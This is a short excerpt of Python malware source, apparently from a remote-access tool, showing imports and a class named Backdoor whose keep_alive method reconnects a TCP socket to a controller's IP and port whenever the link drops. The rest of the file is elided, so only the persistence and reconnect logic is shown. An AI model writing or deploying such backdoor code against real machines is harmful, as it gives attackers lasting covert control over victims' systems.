...
import socket, subprocess, json, os, base64, sys, shutil, time, threading
...
class Backdoor:
	...
	def keep_alive(self):
		if time.time() - self.lastpacket > 10:
			print("connection lost\n")
			self.connection.close()
			self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			self.connection.connect((self.ip, self.port))
		timer= threading.Timer(0, self.keep_alive)
		timer.start()
